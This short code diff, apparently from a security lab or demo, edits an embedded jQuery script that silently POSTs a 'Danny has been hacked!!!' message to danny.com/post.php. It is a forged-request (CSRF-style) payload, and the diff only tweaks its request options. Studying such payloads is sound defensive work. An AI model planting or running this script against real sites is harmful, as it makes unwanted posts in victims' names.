@@ -7,9 +7,11 @@
 	<script>
 
 	$.ajax({
-		'method': 'POST',
+		'type': 'POST',
 		'url': 'http://danny.com/post.php',
-		'data': {'new-post': 'Danny has been hacked!!!'}
+		'data': {'new-post': 'Danny has been hacked!!!'},
+		'cache': false,
+		'dataType': 'JSON'
 	});
 
 	</script>
